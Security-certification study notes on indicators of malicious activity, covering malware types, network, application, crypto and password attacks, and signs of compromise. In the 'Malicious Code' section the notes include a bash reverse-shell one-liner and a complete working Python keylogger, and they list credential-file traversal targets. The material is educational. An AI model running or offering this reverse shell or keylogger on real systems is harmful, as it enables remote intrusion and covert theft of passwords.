# 2.4 Given a scenario, analyze indicators of malicious activity.

# Malware Attacks

## **Potentially Unwanted Programs (PUPs)**

- Programs downloaded within other software.
- Overuse resources and slow down systems.
- Often detected by tools like Malwarebytes.

## **Ransomware**

- Encrypts files and demands ransom, often in cryptocurrency.
- Spread via malicious emails or websites.
- Example: *FBI virus* – impersonated law enforcement to extort victims.

## **Trojans**

- Disguised as legitimate files/software.
- Can create backdoors for attackers, perform surveillance, or steal resources.
- Example: PE files requiring UAC permission.

## **Remote Access Trojans (RATs)**

- Embedded in legitimate files, giving attackers remote control for data theft or further attacks.

## **Worms**

- Self-replicating malware spreading through networks.
- Example: *NIMDA worm* – targeted IIS, consumed bandwidth, renamed files.

## **Spyware**

- Tracks user activity, collects personal data (e.g., credit cards, usernames), and sends it to third parties.
- Operates discreetly; some tracking cookies raise privacy concerns.

## **Bloatware**

- Pre-installed software on devices, consuming resources and slowing performance.

## **Viruses**

- Infect systems by exploiting vulnerabilities, often via emails, files, or links.
- Types:
    - **Resident Virus**: Stays in memory.
    - **Fileless Virus**: Piggybacks on other programs.
    - **Polymorphic Virus**: Evolves to evade detection.

## **Keyloggers**

- Record keystrokes to steal sensitive data (e.g., passwords).

## **Logic Bombs**

- Dormant code triggered by specific events or conditions, e.g., time, scripts, or login.

## **Rootkits**

- Operate at system/kernel level, evading detection and granting remote access to attackers.

## Malware Inspection

- **Sandboxing**: Isolated environments for malware testing (e.g., *Cuckoo sandbox*).
    - Reasons: Testing, patching, and analyzing malicious applications.

# Physical Attacks

## **Physical Brute Force**

- Involves using physical tools (e.g., sledgehammer, crowbar) to break into a facility and steal equipment.
- Not to be confused with password brute-force attacks.

## **RFID Cloning**

**Radio Frequency Identification**

- Cyber intruders clone signals from key cards/badges to access secure areas.
- Devices are used to mimic the signals for unauthorized access.
- **Countermeasure**: Use Multifactor Authentication (MFA) with biometric systems.

## **Environmental Attacks**

- Exploit natural events (e.g., power outages, floods, fires, earthquakes) to disrupt systems.
- Example: Damaging power lines to cause server crashes.
- **Defense**: Build resilient systems that can withstand environmental disasters.
    - Key strategies: Geographic diversity, redundancy, disaster recovery plans, regular testing, and monitoring.

# Network Attacks

## **Pivoting**

- **Definition**: A pivoting attack occurs when an attacker gains access to a vulnerable host on a network and uses that host to target more critical servers (e.g., domain controllers or database servers).
- **Process**:
    - The attacker first uses tools like **nmap** to scan the network and create a fingerprint of hosts, services, and software.
    - After gaining access to an admin account, they often create additional accounts to maintain persistence in the network.

## **Distributed Denial-of-Service (DDoS)**

- **SYN Flood**: Overloads the target with half-open connections, consuming resources.
- **Amplified DDoS**: Exploits protocols (e.g., ICMP) to send small requests that generate large responses.
- **Reflected DDoS**: The attacker spoofs the victim's IP address and sends it to servers, which then flood the victim with traffic.
- **Defense**: Strategies include network enhancements, traffic filtering, and adaptive responses.

## **ARP Poisoning**

- **Definition**: ARP poisoning involves sending fake ARP messages in a local area network (LAN), which causes traffic meant for a victim to be redirected to the attacker’s device.

## **DNS Attacks**

- **Types of DNS Attacks**:
    - **DNS Cache Poisoning (DNS Spoofing)**: Attackers manipulate DNS cache entries to redirect users to fraudulent websites.
    - **DNS Sinkhole**: A technique used to redirect malicious traffic to a controlled environment for analysis or prevention.
- **DNS Resolution Process**: Involves checking the cache, HOSTS file, and root hints to resolve domain names to IP addresses.

### DNS Commands

Command: `ipconfig/displaydns`

- **Function**: To view the DNS cache.

Command: `ipconfig/flushdns`

- **Function**: To clear the DNS cache.

Command: `dnslookup <hostname>`

- **Function**: To check the DNS record in the DNS server.
- **Example**: `dnslookup computer1`

### DNS Tools

- **DNSenum:**
    - A tool in **Kali Linux** used to gather detailed **DNS information** (like domain names, IPs, etc.). It helps with **network security** and **information gathering**.
- **DNSSEC (DNS Security):**
    - A protocol that **secures DNS** by using **digital signatures**. It protects against **DNS cache poisoning**.

## **Wireless Attacks**

### **Rogue Access Points**

 Fake WAPs to steal data, spread malware, or intercept communications. Can be set up on devices like Raspberry Pi.

### **Evil Twin**

 Advanced rogue AP that intercepts communications between users and the legitimate network. Commonly used with well-known SSIDs like café or hotel networks.

### **Deauthentication & Jamming**

 Disrupts legitimate network services by disconnecting devices or blocking network access. Can be detected by monitoring sudden disconnections and signal drops

### **MAC Spoofing & Device Impersonation**

Attacker impersonates legitimate devices by changing MAC addresses. Look out for abnormal MAC address behavior

### **Wi-Fi Analyzer**

 Tool used to scan networks, check signal strength, and spot unusual traffic patterns to detect security breaches.

## On-path Attacks (MITM)

### **Session Replay** Attack

- An attacker intercepts data, like a **session token** (used to remember you after logging in), and **replays it later** to impersonate you.
- **How to protect**: Systems use **timestamps and sequence numbers** (like **USN** numbers) to ensure the data isn’t reused.

### **Replay Attack** (a type of on-path attack)

- **What it is**: An attacker **captures** data (like authentication data) and **replays it later** to get access.
- **How to prevent**: Systems like **Kerberos** (authentication protocol) use **sequence numbers** to make sure the data is **not replayed**.

### **Credential Replay**

- Attacker captures login credentials using tools like wireshark and reuses them for unauthorized access.
- Risk with Telnet (not encrypted), NTLM (easy to hack).
- Prevent by using SSH (encrypted) and enforcing unique passwords.

### **Credential Stuffing**

- Attackers try captured credentials on multiple accounts.
- Symptoms: Spikes in login attempts from various locations.
- Avoid by using unique passwords and password managers.

## Malicious Code

### **Bash Shell Attacks**

- Attackers use Bash scripts to compromise systems, escalate privileges, or manipulate files.
- Example: Reverse shell script allows attackers to control a compromised system remotely.
.sh extension.

`bash -i >& /dev/tcp/$ip/$port 0>&1`  

### **Python-based Malware**

- Python is used to develop malicious scripts, such as keyloggers or data exfiltration tools.
- Python scripts are dynamic and easy to distribute via phishing or compromised websites.

`from pynput.keyboard import Key, Listener
import logging`

`logging.basicConfig(
    filename="mykeylog.txt",
    level=logging.DEBUG,
    format="%(asctime)s - %(message)s"
)`

`def on_press(key):
    try:
        [logging.info](http://logging.info/)(f"Key pressed: {key.char}")
    except AttributeError:
        [logging.info](http://logging.info/)(f"Special key pressed: {key}")`

`with Listener(on_press=on_press) as listener:
    listener.join()`

### **JavaScript Exploits**

- **Purpose**: Client-side attacks like stealing user data, redirecting traffic, or unauthorized transactions.
- **Example Script**: Injected malicious button on a webpage:
    
    ```html
    
    <input type="button" onclick="badscript()">
    
    ```
    
- **Cross-Site Scripting (XSS)**:
    - Injects malicious code into a user’s browser. Example:
        
        ```html
        html
        <script src="myapplication.js"></script>
        
        ```
        

# Application Attacks

## **Injection Attacks**

- Involves inserting untrusted data into inputs, exploiting design flaws.
- **SQL Injection**: E.g., `SELECT * WHERE 1=1`.
- **XSS**: Embeds malicious scripts in web applications.

## **Buffer Overflow**

- Occurs when data exceeds allocated memory, potentially allowing arbitrary code execution.
- **Mitigation**: Windows' Data Execution Prevention (DEP) blocks code execution in non-executable memory.

## **Privilege Escalation**

- Exploits vulnerabilities to gain unauthorized elevated access.
- Example: Exploiting bugs to achieve administrative privileges.

## **Forgery Attacks**

- Manipulates data or requests to impersonate users or applications.
- **CSRF**: Tricks users into performing unauthorized actions.
- **SSRF**: Exploits servers to access sensitive data or internal systems.

## **Directory Traversal**

- Exploits paths to access restricted files.
- Common targets:
    - `/etc/passwd`: User info and hashed passwords.
    - `/etc/shadow`: Encrypted password hashes.
    - `../../../../../`: Indicates traversal up directories.

**!!Mitigation Strategies!!**

## **Input Validation**

- Blocks invalid characters to prevent overflow and injection attacks.

## **Stored Procedures**

- Predefined SQL scripts that prevent SQL manipulation, the best defense against SQL injection.

# Cryptographic Attacks

## **Downgrade Attacks**

- **SSL/TLS Downgrade**: Attacker forces a weaker encryption protocol, compromising security.
- **SSL Stripping**: Downgrades HTTPS to HTTP, allowing eavesdropping on sensitive data.

## **Collision Attacks**

- Exploits hash functions by generating two distinct inputs with the same hash.
- Allows attackers to forge signatures or create malware that appears trusted.

## **Birthday Attack**

- Based on the birthday paradox, it exploits the probability of two inputs sharing the same hash value.
- Use stronger hash algorithms (e.g., SHA3 with 256 bits) to mitigate this risk.

## **Pass-the-Hash Attack**

- Targets older systems (e.g., NTLM in Windows NT 4.0) where passwords are stored as weak hashes.
- Exploits hash weaknesses to recover passwords or escalate privileges.
- **Mitigation**: Use Kerberos for stronger authentication and encrypted password storage.

# Password Attacks

## **Dictionary Attack**

- Uses an exhaustive list of common words to guess passwords.
- Resists passwords with misspellings or special characters.(%$)

## **Password Spraying**

- Focuses on a few common usernames (e.g., admin) and tries common passwords (e.g., 123456).
- Mitigated by strong password policies, MFA, and monitoring login patterns.

## **Brute Force Attack**

- Tries every possible password combination, often using precomputed hash values (rainbow tables).
- Mitigated by account lockout after failed attempts and using salted passwords.

## **Hybrid Attack**

- Combines dictionary and brute-force attacks, often using common word lists and variations.

## **Online vs. Offline Attacks**

- **Online**: Attacker tries passwords directly through the website's login interface.
- **Offline**: Attacker accesses password storage (e.g., /etc/shadow) and cracks passwords offline.

# indicators of Attack (IoA’s)

## **Account Lockout**

- Multiple failed login attempts, especially for privileged accounts, indicate potential brute-force attacks.

## **Concurrent Session Usage**

- Unusual spikes in concurrent sessions may suggest unauthorized access or an active breach.

## **Blocked Content**

- Access attempts to restricted files or data (e.g., via ACLs or DLP systems) can indicate malicious activity.

## **Impossible Travel**

- Logins from distant geographic locations in a short timeframe may signal account compromise.

## **Resource Consumption**

- Spikes in CPU or memory usage can suggest malware infections or DDoS attacks.

## **Resource Inaccessibility**

- Sudden unavailability of critical resources may indicate a cyberattack, such as a DDoS attack.

## **Out-of-Cycle Logging**

- Irregular log generation times could suggest attackers tampering with logs.

## **Published/Documented Vulnerabilities**

- Known vulnerabilities can attract attackers, so regularly checking systems is essential.

## **Missing Logs**

- Missing logs during critical events can indicate tampering or attempts to conceal malicious activities.